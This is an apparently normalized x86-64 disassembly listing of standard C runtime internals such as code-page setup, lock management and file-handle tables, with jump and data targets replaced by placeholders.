push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_14003b928
and [ rw-data ] 0x0
cmp ebx 0xfffffffe
jne r-xdata
cmp ebx 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp ebx 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov rax [ rsp + 0x20 ]
mov [ rw-data ] 0x1
mov eax [ rax + 0x4 ]
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_14004636c
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x38 ] rax
mov rsi rdx
call sub_1400462dc
xor ebx ebx
mov edi eax
test eax eax
jne r-xdata
lea r13 [ rw-data ]
mov ecx ebx
mov rbp rbx
mov rax r13
mov r12d 0x1
mov rcx rsi
call sub_140045fa4
jmp r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_14003d760
lea r10 [ rbp + rbp * 2 ]
lea r11 [ rw-data ]
shl r10 0x4
mov ebp 0x4
lea r8 [ r10 + r13 + 0x10 ]
add ecx r12d
add rbp r12
add rax 0x30
cmp ecx 0x5
jb r-xdata
xor eax eax
add r8 0x8
add r11 r12
sub rbp r12
jne r-xdata
cmp [ rcx + 0x1 ] bl
je r-xdata
cmp [ rax ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov rcx r8
cmp [ r8 ] bl
je r-xdata
mov [ rsi + 0x4 ] edi
sub edi 0x3a4
mov [ rsi + 0x8 ] r12d
je r-xdata
movzx edx [ rcx ]
movzx eax [ rcx + 0x1 ]
cmp edx eax
ja r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi 0xfde9
je r-xdata
mov ebx 0x411
sub edi 0x4
je r-xdata
add rcx 0x2
cmp [ rcx ] bl
jne r-xdata
lea r9 [ rdx + rsi + 0x1d ]
mov rcx [ rsp + 0x38 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x80 ]
add rsp 0x40
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
movzx ecx di
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
movzx eax [ rdi + rcx ]
mov [ rcx ] ax
add rcx 0x2
sub rdx r12
jne r-xdata
mov rcx rsi
call sub_140046030
mov ebx 0x804
jmp r-xdata
sub edi 0xd
je r-xdata
mov al [ r11 ]
add edx r12d
or [ r9 ] al
movzx eax [ rcx + 0x1 ]
add r9 r12
cmp edx eax
jbe r-xdata
lea rdx [ rsp + 0x20 ]
mov ecx edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
sub r10 rsi
mov [ rsi + 0xc ] ebx
lea rcx [ rsi + 0x10 ]
lea rdi [ r10 + r13 - 0xc ]
mov edx 0x6
mov ebx 0x412
jmp r-xdata
dec edi
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_14003d760
mov [ rsi + 0x4 ] edi
mov [ rsi + 0xc ] ebx
cmp [ rsp + 0x20 ] r12d
jbe r-xdata
mov ebx 0x404
jmp r-xdata
mov [ rsi + 0x8 ] ebx
lea rax [ rsp + 0x26 ]
cmp [ rsp + 0x26 ] bl
je r-xdata
lea rax [ rsi + 0x1e ]
mov ecx 0xfe
cmp [ rax + 0x1 ] bl
je r-xdata
or [ rax ] 0x8
add rax r12
sub rcx r12
jne r-xdata
mov ecx [ rsi + 0x4 ]
sub ecx 0x3a4
je r-xdata
movzx edi [ rax ]
movzx ecx [ rax + 0x1 ]
cmp edi ecx
ja r-xdata
mov eax 0x411
sub ecx 0x4
je r-xdata
add rax 0x2
cmp [ rax ] bl
jne r-xdata
sub ecx edi
lea rdx [ rdi + rsi + 0x1d ]
add ecx r12d
lea rdi [ rsi + 0x10 ]
movzx eax bx
mov ecx 0x6
[ rdi ]
jmp r-xdata
mov eax 0x804
jmp r-xdata
sub ecx 0xd
je r-xdata
or [ rdx ] 0x4
add rdx r12
sub rcx r12
jne r-xdata
mov [ rsi + 0xc ] eax
mov [ rsi + 0x8 ] r12d
jmp r-xdata
mov eax 0x412
jmp r-xdata
dec ecx
je r-xdata
mov eax 0x404
jmp r-xdata
mov eax ebx
jmp r-xdata
sub_1400465e4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
sub rsp 0x30
mov edi ecx
or r13d 0xffffffff
call sub_140043c34
mov rsi rax
call sub_140046220
mov rbx [ rsi + 0xb8 ]
mov ecx edi
call sub_1400462dc
mov r12d eax
cmp eax [ rbx + 0x4 ]
je r-xdata
xor edi edi
mov r13d edi
mov ecx 0x220
call sub_140041684
mov rbx rax
xor edi edi
test rax rax
je r-xdata
mov eax r13d
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
mov r12 [ rsp + 0x58 ]
add rsp 0x30
pop r13
retn
mov rdx [ rsi + 0xb8 ]
mov rcx rax
mov r8d 0x220
call sub_14003a8c0
mov [ rbx ] edi
mov rdx rbx
mov ecx r12d
call sub_14004636c
mov r13d eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov rcx [ rsi + 0xb8 ]
lea r12 [ rw-data ]
[ rcx ]
jne r-xdata
lea r12 [ rw-data ]
cmp rbx r12
je r-xdata
mov [ rsi + 0xb8 ] rbx
[ rbx ]
test [ rsi + 0xc8 ] 0x2
jne r-xdata
mov rcx [ rsi + 0xb8 ]
cmp rcx r12
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
jmp r-xdata
mov rcx rbx
call sub_14003ad04
test [ rw-data ] 0x1
jne r-xdata
call sub_14003ad04
mov esi 0xd
mov ecx esi
call sub_140046c48
nop
mov eax [ rbx + 0x4 ]
mov [ rw-data ] eax
mov eax [ rbx + 0x8 ]
mov [ rw-data ] eax
mov eax [ rbx + 0xc ]
mov [ rw-data ] eax
mov edx edi
lea r8 [ __dos_header ]
mov edx edi
movsxd rcx edx
movzx eax [ rbx + rcx * 2 + 0x10 ]
mov [ r8 + rcx * 2 + 0x966d8 ] ax
inc edx
jmp r-xdata
mov [ rsp + 0x20 ] edi
cmp edi 0x100
jge r-xdata
movsxd rcx edx
mov al [ rcx + rbx + 0x1c ]
mov [ rcx + r8 + 0x922d0 ] al
inc edx
jmp r-xdata
mov [ rsp + 0x20 ] edx
cmp edx 0x5
jge r-xdata
mov rax [ rw-data ]
[ rax ]
jne r-xdata
movsxd rcx edi
mov al [ rcx + rbx + 0x11d ]
mov [ rcx + r8 + 0x923e0 ] al
inc edi
jmp r-xdata
mov [ rsp + 0x20 ] edx
cmp edx 0x101
jge r-xdata
mov [ rw-data ] rbx
[ rbx ]
mov ecx esi
call sub_140046b48
jmp r-xdata
mov rcx [ rw-data ]
cmp rcx r12
je r-xdata
call sub_14003ad04
sub_1400467ec
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] cx
push rbp
mov rbp rsp
sub rsp 0x50
mov eax 0xffff
cmp cx ax
je r-xdata
mov rbx [ rsp + 0x68 ]
add rsp 0x50
pop rbp
retn
lea rcx [ rbp - 0x20 ]
call sub_14003b928
mov rbx [ rbp - 0x20 ]
cmp [ rbx + 0x14 ] 0x0
jne r-xdata
movzx ecx [ rbp + 0x10 ]
mov edx 0x100
cmp cx dx
jae r-xdata
movzx edx [ rbp + 0x10 ]
lea eax [ rdx - 0x41 ]
cmp ax 0x19
ja r-xdata
mov ecx [ rbx + 0x14 ]
lea rax [ rbp + 0x20 ]
mov r9d 0x1
mov [ rsp + 0x28 ] r9d
lea r8 [ rbp + 0x10 ]
mov [ rsp + 0x20 ] rax
call sub_1400413fc
test eax eax
movzx eax [ rbp + 0x10 ]
je r-xdata
mov edx 0x1
call sub_140051540
test eax eax
jne r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
add dx 0x20
cmp [ rbp - 0x8 ] 0x0
je r-xdata
movzx eax [ rbp + 0x20 ]
movzx ecx [ rbp + 0x10 ]
mov rax [ rbx + 0x148 ]
movzx eax [ rax + rcx ]
jmp r-xdata
movzx eax [ rbp + 0x10 ]
jmp r-xdata
movzx eax dx
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_1400468c4
push rbx
sub rsp 0x20
xor r10d r10d
mov r9 rcx
test rcx rcx
je r-xdata
call sub_14003f1a4
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
sub rcx r8
mov [ rcx ] r10w
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] r10w
call sub_14003f1a4
mov ebx 0x22
jmp r-xdata
movzx eax [ r8 ]
mov [ rcx + r8 ] ax
add r8 0x2
test ax ax
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_140043760
mov eax ebx
sub_140046930
push rbx
sub rsp 0x20
and [ rsp + 0x40 ] 0x0
lea r8 [ rsp + 0x40 ]
call sub_14004f8b4
mov rbx rax
test rax rax
jne r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
cmp [ rsp + 0x40 ] eax
je r-xdata
call sub_14003f1a4
test rax rax
je r-xdata
call sub_14003f1a4
mov ecx [ rsp + 0x40 ]
mov [ rax ] ecx
sub_140046990
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
xor edi edi
lea ecx [ rdi + 0x1 ]
call sub_140046c48
nop
lea ebx [ rdi + 0x3 ]
mov ecx 0x1
call sub_140046b48
mov eax edi
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
movsxd rsi ebx
mov rax [ rw-data ]
cmp [ rax + rsi * 8 ] 0x0
je r-xdata
inc ebx
jmp r-xdata
mov rcx [ rax + rsi * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
mov [ rsp + 0x20 ] ebx
cmp ebx [ rw-data ]
jge r-xdata
cmp ebx 0x14
jl r-xdata
call sub_14003b6d8
cmp eax 0xffffffff
je r-xdata
mov rax [ rw-data ]
mov rcx [ rax + rsi * 8 ]
add rcx 0x30
call [ DeleteCriticalSection@IAT ]
mov rcx [ rw-data ]
mov rcx [ rcx + rsi * 8 ]
call sub_14003ad04
mov r11 [ rw-data ]
and [ r11 + rsi * 8 ] 0x0
inc edi
mov [ rsp + 0x24 ] edi
sub_140046a3c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x20
lea r12 [ rw-data ]
xor esi esi
xor ebx ebx
mov rdi r12
inc ebx
add rdi 0x10
cmp ebx 0x24
jl r-xdata
movsxd rax esi
mov edx 0xfa0
inc esi
lea rcx [ rax + rax * 4 ]
lea rax [ rw-data ]
lea rcx [ rax + rcx * 8 ]
mov [ rdi ] rcx
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ rdi + 0x8 ] 0x1
jne r-xdata
mov eax 0x1
movsxd rax ebx
add rax rax
and [ r12 + rax * 8 ] 0x0
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r12
retn
sub_140046ac0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov edi 0x24
lea rbx [ rw-data ]
mov esi edi
add rbx 0x10
dec rsi
jne r-xdata
cmp [ rbx + 0x8 ] 0x1
je r-xdata
mov rbp [ rbx ]
test rbp rbp
je r-xdata
lea rbx [ rw-data ]
mov rcx rbp
call [ DeleteCriticalSection@IAT ]
mov rcx rbp
call sub_14003ad04
and [ rbx ] 0x0
add rbx 0x10
dec rdi
jne r-xdata
cmp [ rbx ] 0x1
jne r-xdata
mov rcx [ rbx - 0x8 ]
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
call [ DeleteCriticalSection@IAT ]
sub_140046b60
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r13
sub rsp 0x20
movsxd rbx ecx
mov esi 0x1
cmp [ rw-data ] 0x0
jne r-xdata
mov rdi rbx
add rdi rdi
lea r13 [ rw-data ]
cmp [ r13 + rdi * 8 ] 0x0
je r-xdata
call sub_140043a80
lea ecx [ rsi + 0x1d ]
call sub_140043820
mov ecx 0xff
call sub_14003de68
mov ecx 0x28
call sub_140041684
mov rbx rax
test rax rax
jne r-xdata
mov eax esi
jmp r-xdata
mov ecx 0xa
call sub_140046c48
nop
mov rcx rbx
cmp [ r13 + rdi * 8 ] 0x0
jne r-xdata
call sub_14003f1a4
mov [ rax ] 0xc
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r13
retn
call sub_14003ad04
nop
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ r13 + rdi * 8 ] rbx
jmp r-xdata
mov rcx rbx
call sub_14003ad04
call sub_14003f1a4
mov [ rax ] 0xc
xor esi esi
jmp r-xdata
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
sub_140046c48
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
lea rdi [ rw-data ]
add rbx rbx
cmp [ rdi + rbx * 8 ] 0x0
jne r-xdata
mov rcx [ rdi + rbx * 8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp [ EnterCriticalSection@IAT ]
call sub_140046b60
test eax eax
jne r-xdata
lea ecx [ rax + 0x11 ]
call sub_14003e1c4
sub_140046c8c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
test ecx ecx
js r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
call sub_14003f1c4
and [ rax ] 0x0
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
movsxd rdi ecx
lea rbp [ rw-data ]
mov rsi rdi
and edi 0x1f
sar rsi 0x5
imul rdi rdi 0x58
mov rax [ rbp + rsi * 8 ]
cmp [ rdi + rax ] 0xffffffffffffffff
jne r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov rax [ rbp + rsi * 8 ]
mov [ rdi + rax ] rbx
xor eax eax
jmp r-xdata
test ecx ecx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov ecx 0xfffffff6
dec ecx
je r-xdata
mov ecx 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
mov ecx 0xfffffff4
jmp r-xdata
sub_140046d3c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rdi
sub rsp 0x20
test ecx ecx
js r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
call sub_14003f1c4
and [ rax ] 0x0
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
movsxd rbx ecx
lea rbp [ rw-data ]
mov rdi rbx
and ebx 0x1f
sar rdi 0x5
imul rbx rbx 0x58
mov rax [ rbp + rdi * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
cmp [ rax + rbx ] 0xffffffffffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov rax [ rbp + rdi * 8 ]
or [ rbx + rax ] 0xffffffffffffffff
xor eax eax
jmp r-xdata
test ecx ecx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov ecx 0xfffffff6
dec ecx
je r-xdata
mov ecx 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
xor edx edx
call [ SetStdHandle@IAT ]
mov ecx 0xfffffff4
jmp r-xdata
sub_140046de8
sub rsp 0x28
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_14003f1c4
and [ rax ] 0x0
call sub_14003f1a4
mov [ rax ] 0x9
jmp r-xdata
call sub_14003f1c4
and [ rax ] 0x0
call sub_14003f1a4
mov [ rax ] 0x9
call sub_140043760
cmp ecx [ rw-data ]
jae r-xdata
or rax 0xffffffffffffffff
movsxd rdx ecx
lea rcx [ rw-data ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rax [ rcx + rax * 8 ]
test [ rax + rdx + 0x8 ] 0x1
je r-xdata
mov rax [ rax + rdx ]
jmp r-xdata
add rsp 0x28
retn
sub_140046e5c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r14
sub rsp 0x20
movsxd rbx ecx
mov r12 rbx
sar r12 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rsi [ r14 + r12 * 8 ]
mov edi 0x1
cmp [ rbx + rsi + 0xc ] 0x0
jne r-xdata
test edi edi
je r-xdata
lea ecx [ rdi + 0x9 ]
call sub_140046c48
nop
cmp [ rbx + rsi + 0xc ] 0x0
jne r-xdata
mov eax edi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
mov r12 [ rsp + 0x48 ]
add rsp 0x20
pop r14
retn
mov rcx [ r14 + r12 * 8 ]
lea rcx [ rcx + rbx + 0x10 ]
call [ EnterCriticalSection@IAT ]
mov ecx 0xa
call sub_140046b48
lea rcx [ rbx + rsi + 0x10 ]
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
neg eax
sbb edx edx
and edi edx
inc [ rbx + rsi + 0xc ]
sub_140046f2c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x40
or rsi 0xffffffffffffffff
mov r12d esi
xor r13d r13d
lea ebx [ rsi + 0xc ]
mov ecx ebx
call sub_140046b60
test eax eax
jne r-xdata
mov ecx ebx
call sub_140046c48
nop
xor edi edi
mov eax esi
jmp r-xdata
mov ecx 0xb
call sub_140046b48
mov eax r12d
movsxd r14 edi
mov rbx [ rax + r14 * 8 ]
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov rdi [ rsp + 0x70 ]
add rsp 0x40
pop r14
pop r13
pop r12
retn
mov edx 0x58
lea ecx [ rdx - 0x38 ]
call sub_140041704
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov [ rsp + 0x30 ] rbx
mov rax [ rax + r14 * 8 ]
add rax 0xb00
cmp rbx rax
jae r-xdata
movsxd rdx edi
lea r8 [ rw-data ]
mov [ r8 + rdx * 8 ] rax
add [ rw-data ] 0x20
cmp r12d esi
jne r-xdata
test [ rbx + 0x8 ] 0x1
jne r-xdata
shl edi 0x5
mov [ rsp + 0x20 ] edi
movsxd rcx edi
mov rax rcx
sar rax 0x5
and ecx 0x1f
imul rcx rcx 0x58
mov rax [ r8 + rax * 8 ]
mov [ rax + rcx + 0x8 ] 0x1
mov ecx edi
call sub_140046e5c
test eax eax
cmove edi esi
mov r12d edi
mov [ rsp + 0x20 ] edi
mov [ rax + 0x8 ] 0x0
mov [ rax ] rsi
mov [ rax + 0x9 ] 0xa
and [ rax + 0xc ] 0x0
add rax 0x58
mov [ rsp + 0x30 ] rax
jmp r-xdata
inc edi
jmp r-xdata
add rbx 0x58
or rsi 0xffffffffffffffff
lea rax [ rw-data ]
jmp r-xdata
cmp [ rbx + 0xc ] 0x0
jne r-xdata
mov rcx [ r8 + rdx * 8 ]
add rcx 0xb00
cmp rax rcx
jae r-xdata
lea rax [ rw-data ]
mov [ rsp + 0x24 ] edi
cmp edi 0x40
jge r-xdata
test r13d r13d
jne r-xdata
mov ecx 0xa
call sub_140046c48
nop
cmp [ rbx + 0xc ] 0x0
jne r-xdata
lea rcx [ rbx + 0x10 ]
call [ EnterCriticalSection@IAT ]
test [ rbx + 0x8 ] 0x1
je r-xdata
mov ecx 0xa
call sub_140046b48
lea rcx [ rbx + 0x10 ]
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
or rsi 0xffffffffffffffff
test r13d r13d
jne r-xdata
lea rcx [ rbx + 0x10 ]
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
inc [ rbx + 0xc ]
lea r13d [ rax + 0x1 ]
mov [ rsp + 0x28 ] r13d
jmp r-xdata
mov [ rbx + 0x8 ] 0x1
mov [ rbx ] rsi
lea r8 [ rw-data ]
sub rbx [ r8 + r14 * 8 ]
mov rax 0x2e8ba2e8ba2e8ba3
imul rbx
mov r12 rdx
sar r12 0x4
mov rax r12
shr rax 0x3f
add r12 rax
mov eax edi
shl eax 0x5
add r12d eax
mov [ rsp + 0x20 ] r12d
jmp r-xdata
sub_140047134
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
push r12
push r13
mov rbp rsp
sub rsp 0x40
movzx esi [ rdx + 0x42 ]
movzx r12d [ rdx + 0x44 ]
mov rdi rcx
test rcx rcx
jne r-xdata
and [ rbp - 0x8 ] 0x0
lea rax [ rcx + 0x8 ]
mov r9d 0x31
lea r13d [ r9 - 0x30 ]
mov [ rbp - 0x10 ] rdx
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea rcx [ rdi + 0x10 ]
lea r9d [ r13 + 0x31 ]
mov [ rsp + 0x20 ] rcx
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov ebx eax
call sub_14004e83c
lea rcx [ rdi + 0x18 ]
lea r9d [ r13 + 0x32 ]
mov [ rsp + 0x20 ] rcx
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
or ebx eax
call sub_14004e83c
lea r9d [ r13 + 0x33 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x20 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x34 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x28 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x35 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x30 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x36 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rdi
or ebx eax
call sub_14004e83c
lea r9d [ r13 + 0x29 ]
or ebx eax
lea rax [ rdi + 0x40 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x2a ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x48 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x2b ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x50 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
or ebx eax
lea rax [ rdi + 0x58 ]
lea r9d [ r13 + 0x2c ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x2d ]
or ebx eax
lea rax [ rdi + 0x60 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x2e ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x68 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x2f ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x38 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x43 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x70 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x44 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x78 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x45 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x80 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x46 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x88 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x47 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x90 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x48 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x98 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
or ebx eax
lea rax [ rdi + 0xa0 ]
lea r9d [ r13 + 0x49 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x4a ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xa8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x4b ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xb0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x4c ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xb8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x4d ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xc0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x4e ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xc8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x37 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xd0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x38 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xd8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x39 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xe0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x3a ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xe8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
or ebx eax
lea rax [ rdi + 0xf0 ]
lea r9d [ r13 + 0x3b ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x3c ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xf8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x3d ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x100 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x3e ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x108 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_14004e83c
lea r9d [ r13 + 0x3f ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x110 ]
